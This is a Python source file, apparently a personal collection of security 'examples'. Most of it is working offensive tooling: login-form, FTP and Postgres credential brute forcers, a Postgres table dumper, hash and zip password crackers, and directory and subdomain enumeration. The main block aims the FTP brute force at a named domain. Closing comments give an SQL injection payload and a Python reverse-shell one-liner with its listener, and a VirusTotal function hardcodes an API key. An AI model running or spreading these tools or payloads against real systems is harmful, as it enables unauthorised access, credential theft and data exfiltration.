import os
import re
import nmap
import requests
import subprocess
import xml.etree.ElementTree as xml
import time
import itertools
import hashlib
import zipfile
import shutil
import json
import smtplib, ssl
import platform
import psycopg2
import ftplib

from requests.api import head

class Examples:

    # ACTIVE SCAN

    @staticmethod
    def run_console_command(command):
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        print(cmd.stdout.read().decode("utf8"))

    @staticmethod
    def find_subfolders(domain, wordlist, scheme="http://", method="GET", success_codes=[200, 301, 302]):
        """
            domain   : example.com
            wordlist : path/to/wordlist.txt
        """
        with open(wordlist) as words:
            for word in words:
                word = word.strip()
                try:
                    r = requests.request(method, f"{scheme}{domain}/{word}")
                    if r.status_code in success_codes:
                        print("\rFOUND :", r.status_code, "/" + word.ljust(100))
                    else:
                        print(f"\rRequest to: {word.ljust(100)}", end="")
                except requests.exceptions.ConnectionError:
                    print(f"\rRequest to: {word.ljust(100)}", end="")

    @staticmethod
    def find_subdomains(domain, wordlist, scheme="http://", method="GET", success_codes=[200, 301, 302]):
        """
            domain   : example.com
            wordlist : path/to/wordlist.txt
        """
        with open(wordlist) as words:
            for word in words:
                word = word.strip()
                try:
                    r = requests.request(method, f"{scheme}{word}.{domain}")
                    if r.status_code in success_codes:
                        print("\rFOUND :", r.status_code, f"{word}.{domain}".ljust(100))
                    else:
                        print(f"\rRequest to: {word.ljust(100)}", end="")
                except requests.exceptions.ConnectionError:
                    print(f"\rRequest to: {word.ljust(100)}", end="")
                except UnicodeError:
                    print(f"\rRequest to: {word.ljust(100)}", end="")

    @staticmethod
    def github_session_bypass(user_session = None):
        cookies = {
            "user_session" : user_session
        }
        r = requests.get("https://github.com/settings/profile", cookies=cookies)
        print("Status Code :", r.status_code)
        print("Redirect History :", r.history)
        print("Is Login Page :", "Sign in to GitHub" in r.text)

    @staticmethod
    def site_information(domain, scheme="http://"):
        print(f"Site : {scheme}{domain}")

        # Print headers
        print("\n--- HEADERS ---")
        r = requests.get(f"{scheme}{domain}")
        if r.status_code == 200:
            for key, value in r.headers.items():
                print(key, ":", value)
        else:
            print("Site not found!")

        # Robots.txt
        print("\n--- ROBOTS.TXT ---")
        r = requests.get(f"{scheme}{domain}/robots.txt")
        if r.status_code == 200:
            print(r.text)
        else:
            print("Robots.txt file is not found!")

        # Sitemap
        print("\n--- SITEMAP ---")
        r = requests.get(f"{scheme}{domain}/sitemap.xml")
        if r.status_code == 200:
            root = xml.fromstring(r.text)
            for url in root:
                print(url[0].text)
        else:
            print("Sitemap.xml file is not found!")

    @staticmethod
    def parse_urls_and_mails(url):
        print(f"Site : {url}")
        mail_regex = r"(\b[\w.]*@[\w]*.(com\.tr|com|net)\b)"
        url_regex = r"(https?://[\w]*.(com\.tr|com|net))"
        
        r = requests.get(url)
        if r.status_code != 200:
            print("Web page not found!")
            return

        # Print Mails
        print("\n--- MAILS ---")
        mails = re.findall(mail_regex, r.text)
        print(*[k[0] for k in mails], sep="\n")

        # Print Urls
        print("\n--- URLS ---")
        urls = re.findall(url_regex, r.text)
        print(*[k[0] for k in urls], sep="\n")
        
    @staticmethod
    def form_brute_force(url, username_wordlist, pass_wordlist, success_word, method = "POST"):
        usernames = open(username_wordlist)
        passwords = open(pass_wordlist)

        try:
            for username in usernames:
                for passwd in passwords:
                    username    = username.strip()
                    passwd      = passwd.strip()

                    print(f"\rLoking for '{username}':'{passwd}'".ljust(100), end="")

                    payload = {
                        "username" : username,
                        "password" : passwd
                    }
                    r = requests.request(method, url, data = payload)
                    if success_word in r.text:
                        print(f"\nFOUND! Username : {username} - Password : {passwd}".ljust(100))
                        return

        except Exception as exp:
            print(exp)
        finally:
            usernames.close()
            passwords.close()

    @staticmethod
    def port_scanner(ip_address, port_range = None, arguments = "-F"):
        print(f"{ip_address} is scanning...")
        
        n = nmap.PortScanner()
        if arguments and "-F" in arguments or not port_range:
            n.scan(ip_address, arguments=arguments)
        else:
            n.scan(ip_address, port_range, arguments=arguments)
        print("Command:", n.command_line(), end="\n\n")
        
        for host in n.all_hosts():
            print(f"Host : {host} ({n[host].state()})")
            for proto in n[host].all_protocols():
                print(f"\nProtocol : {proto}")

                ports = list(n[host][proto].keys())
                ports.sort()
                for port in ports:
                    print(f"port : {port}\tstate : {n[host][proto][port]['state']}")

    class PostgresCracker:

        def __init__(self, hostname, user_wordlist, pass_wordlist, port=5432, default_db = "postgres"):
            self.hostname = hostname
            self.port = port
            self.user_wordlist = user_wordlist
            self.pass_wordlist = pass_wordlist
            self.db_name = default_db

            self.username = None
            self.password = None
            self.connection = None
            self.databases = None

        def _connect_db(self, _user, _pass, db_name = None):
            try:
                connection = psycopg2.connect(
                    user = _user,
                    password = _pass,
                    host = self.hostname,
                    port = str(self.port),
                    database = self.db_name if not db_name else db_name
                )
                return connection
            except psycopg2.OperationalError:
                return None

        def crack_credentials(self):
            with open(self.user_wordlist) as userlist:
                for user in userlist:
                    user = user.strip()
                    with open(self.pass_wordlist) as passlist:
                        for passwd in passlist:
                            passwd = passwd.strip()

                            print(f"\rTrying '{user}':'{passwd}'".ljust(50), end="")
                            con = self._connect_db(user, passwd)
                            if con:
                                self.username = user
                                self.password = passwd
                                self.connection = con
                                print("\n\n--- CREDENTIALS ---")
                                print(f"  USER: '{user}'\n  PASS: '{passwd}'")
                                return

        def list_databases(self):
            if not self.connection:
                print("You should crack credentials first!")
                return

            cursor = self.connection.cursor()
            cursor.execute("SELECT datname FROM pg_database where datistemplate = false;")
            self.databases = [k[0] for k in cursor.fetchall()]
            cursor.close()

            print("\n--- DATABASES ---")
            print("  " + "\n  ".join(self.databases))

        def change_database(self, db_name):
            con = self._connect_db(self.username, self.password, db_name)
            if con:
                self.connection = con
                print(f"\nDatabase changed to {db_name}")
            else:
                print(f"\nCould not connect to {db_name}")

        def list_database_tables(self):
            if not self.connection:
                print("You should crack credentials first!")
                return

            cursor = self.connection.cursor()
            cursor.execute("select table_catalog, table_schema, table_name from information_schema.tables where table_schema = 'public';")
            tables = [k[2] for k in cursor.fetchall()]
            cursor.close()

            print("\n--- TABLES ---")
            print("  " + "\n  ".join(tables))

        def print_table_content(self, table_name):
            if not self.connection:
                print("You should crack credentials first!")
                return

            cursor = self.connection.cursor()
            cursor.execute(f"""select * from "{table_name}";""")
            colnames = [desc[0] for desc in cursor.description]
            content = cursor.fetchall()
            cursor.close()

            print("\n--- TABLE CONTENT ---\n")

            print(" ".join([k.ljust(15) for k in colnames]))
            print(("-" * 15 + " ") * len(colnames))
            for item in content:
                print(" ".join([str(k).ljust(15) for k in item]))

    @staticmethod
    def ftp_brute_force(host, port:int, username_wordlist, pass_wordlist):
        ftp = ftplib.FTP()

        try:
            ftp.connect(host, port)
            print("+ Connected to FTP server.")
        except Exception as exp:
            print("- Cannot connect to FTP server!")
            print(exp)
            return

        with open(username_wordlist) as userlist:
            for user in userlist:
                user = user.strip()
                
                with open(pass_wordlist) as passlist:
                    for passwd in passlist:
                        passwd = passwd.strip()

                        print(f"\r- Trying '{user}':'{passwd}'".ljust(50), end="")
                        try:
                            ftp.connect(host, port)
                            ftp.login(user, passwd)
                            print(f"\n+ FOUND! Username: '{user}' - Password: '{passwd}'")
                            return
                        except:
                            pass

    # SYSTEM RESARCH

    @staticmethod
    def file_finder(path, search_keyword, output_file = None):
        if output_file:
            file = open(output_file, "w")
        for dirname, _, files in os.walk(path):
            for filename in files:
                _path = f"{dirname}\{filename}"
                print(f"\rSearching : {_path[-60:]}".ljust(100), end="")
                if search_keyword in filename:
                    if output_file:
                        file.write(_path + "\n")
                    else:
                        print(f"\rFOUND : {_path}".ljust(100))
        if output_file:
            file.close()

    # CRYPTOGRAPHY

    @staticmethod
    def create_wordlist(length, output_file, letters:str = None):
        if not letters:
            letters = [chr(i) for i in range(ord("a"), ord("z"))]
        
        def word_generator(prefix, limit, letters):
            for letter in letters:
                _w = prefix + str(letter)
                if len(_w) >= limit:
                    yield _w
                else:
                    yield from word_generator(_w, limit, letters)

        with open(output_file, "w") as f:
            for word in word_generator("", length, letters):
                f.write(word + "\n")

    @staticmethod
    def create_wordlist_combination(output_file, *args):
        with open(output_file, "w") as f:
            for word in itertools.product(args, repeat=len(args)):
                f.write("".join([str(k) for k in word]) + "\n")

    @staticmethod
    def hash_cracker(hash, type, wordlist):
        typelist = ["md5", "sha1", "sha256", "sha512"]
        type = type.lower()
        if type not in typelist:
            print("Unknown hash type!")
            return

        with open(wordlist) as words:
            for word in words:
                word = word.strip()
                print(f"\rTrying : '{word}'".ljust(100), end="")

                cracked = True if \
                    type == "md5" and hashlib.md5(word.encode()).hexdigest() == hash or \
                    type == "sha1" and hashlib.sha1(word.encode()).hexdigest() == hash or \
                    type == "sha256" and hashlib.sha256(word.encode()).hexdigest() == hash or \
                    type == "sha512" and hashlib.sha512(word.encode()).hexdigest() == hash \
                        else False

                if cracked:
                    print(f"\rCRACKED : {word}".ljust(100))
                    return
                    
            print("\rHash could not cracked!".ljust(100))

    @staticmethod
    def zip_cracker(path, wordlist):
        zip_file = zipfile.ZipFile(path)

        with open(wordlist) as words:
            for word in words:
                word = word.strip()
                print(f"\rTrying : '{word}'".ljust(100), end="")

                try:
                    zip_file.extractall(path = "out", pwd=word.encode())
                except:
                    continue
                else:
                    print(f"\rFOUND! Zip password is '{word}'".ljust(100))
                    shutil.rmtree("out")
                    return

        
        print("Password not found!")
                    
    # DEFANSIVE SECURITY

    @staticmethod
    def convert_csv_to_json(src_path, dest_path):
        values = []
        with open(src_path) as f:

            headers = [k.strip().replace('"','') for k in next(f).split(",")]

            for line in f:
                data = [k.strip().replace('"','') for k in line.split(",")]
                values.append(dict(zip(headers, data)))

        with open(dest_path, "w") as f:
            json.dump(values, f)

    @staticmethod
    def scan_file_on_virustotal(file):
        url_upload   = "https://www.virustotal.com/api/v3/files"
        url_analyses = "https://www.virustotal.com/api/v3/analyses/%s"
        files        = { "file" : open(file, "rb") }
        headers      = { "x-apikey" : "9ac4a1bdfb6bb38e1774515557693aa9b3b48abe37b4db8b6af2333be9800e8a" }

        # upload file
        req = requests.post(url_upload, files = files, headers = headers)
        if req.status_code != 200 or "data" not in req.json() or "id" not in req.json().get("data"):
            print(f"Malformed response! Status: {req.status_code} Content: {req.text}")
            return

        analysis_id = req.json().get("data").get("id")
        print("Analysis started. ID:", analysis_id)

        # get analysis result
        for _ in range(10):
            r = requests.get(url_analyses % analysis_id, headers = headers)
            if r.status_code != 200 or "data" not in r.json() or "meta" not in r.json():
                print(f"Malformed response! Status: {r.status_code} Content: {r.text}")
                return
            
            status = r.json().get("data").get("attributes").get("status")
            if status == "completed":
                break

            print(f"Waiting for response... {r.status_code} {status}")
            time.sleep(30)

        if r.json().get("data").get("attributes").get("status") != "completed":
            print(f"Malformed response! Status: {r.status_code} Content: {r.text}")
            return
        
        print("\n--- FILE INFO ---")
        for key, value in r.json().get("meta").get("file_info").items():
            print(f"{key}\t: {value}")

        print("\n--- ANALYSIS RESULT ---")
        results = r.json().get("data").get("attributes").get("results").items()
        results = dict(sorted(results, key = lambda tple : \
            0 if tple[1].get("category") == "malicious" else \
            1 if tple[1].get("category") == "undetected" else 2 ))

        for name, result in results.items():
            if (result.get("category") != "type-unsupported"):
                print(f"{name.ljust(25)}: {result.get('category')} ({result.get('result') or '-'})")

    @staticmethod
    def send_email(sender, reciver, content, password, server="smtp.yandex.com", port=465):
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(server, port) as mail:
            mail.login(sender, password)
            mail.sendmail(sender, reciver, content)

    @staticmethod
    def get_indicators_from_alienvault(output_file, token:str, limit:int = 1):
        url_pulses = "https://otx.alienvault.com/otxapi/pulses"
        url_indicators = "https://otx.alienvault.com/otxapi/pulses/%s/indicators"
        headers = {"Authorization" : f"Bearer {token}"}

        # get pulses
        payload = { "limit" : limit, "sort" : "-created" }
        r = requests.get(url_pulses, params=payload, headers=headers)
        if r.status_code != 200 or "results" not in r.json():
            print(f"Malformed response! Status code: {r.status_code}")
            return

        pulse_ids = [k.get("id") for k in r.json().get("results")]
        
        # get indicators
        def get_indicators(pulse_id):
            r = requests.get(url_indicators % pulse_id)
            if r.status_code != 200 or "results" not in r.json():
                print(f"Malformed response! Status code: {r.status_code}")
                return []

            return [
                (k.get("created"),k.get("type"),k.get("indicator")) 
                    for k in r.json().get("results")
                        if k.get("is_active") == 1
            ]

        # get indicators and save to csv file
        csv_headers = "created, type, indicator\n"
        with open(output_file, "w") as f:
            f.write(csv_headers)
            for id in pulse_ids:
                f.write("\n".join([", ".join(k) for k in get_indicators(id)]))
                    
    @staticmethod
    def check_status(asset, type = "ping"):
        if not type in ["ping", "http"]:
            print("Type parameter is not valid!")
            return

        status = False

        if type == "ping":
            parameter = "-n" if platform.system().lower() == "windows" else "-c"
            asset = asset.replace("http://","").replace("https://","")

            r = subprocess.Popen(f"ping {parameter} 1 {asset}", shell=True, stdout=subprocess.PIPE)
            r.wait()

            status = True if r.returncode == 0 else False
            r.terminate()

        elif type == "http":
            if asset[:7] != "http://" and asset[:8] != "https://":
                asset = "http://" + asset
            r = requests.get(asset)
            status = True if r.status_code in [200,201,301,302] else False

        if status:
            print(f"'{asset}' is up.")
        else:
            print(f"'{asset}' is down!")

if __name__ == "__main__":
    Examples.ftp_brute_force("serhatsonmez.net", 2121, "wordlists/wordlist.txt", "wordlists/wordlist.txt")

"""
HASH Examples:

    MD5     - secret     : 5ebe2294ecd0e0f08eab7690d2a6ee69
    SHA1    - secret     : e5e9fa1ba31ecd1ae84f75caaa474f3a663f05f4
    SHA256  - s3cr3tP4ss : c2d67b9da146fa195d293d37a8307b6f1bb16ae64c0112d974f02f2083d7a689
    SHA512  - s3cr3tP4ss : 69cff7f633bd375d73f244e072d8934b8de7666a0a2db77fb10ae9cb90a66e07c4f0eb27699caf1664c638cebeeafe79fb9df1f16bfb2864369e010d944801df
"""

"""
    SQL Injection Payload : 
        admin' OR 1 = 1; -- -'
"""

"""
Python reverse shell : 

    python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.25.192.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

    ncat -lvp 4444

Upgrade to Interactive TTYs

    python -c 'import pty; pty.spawn("/bin/bash")'
"""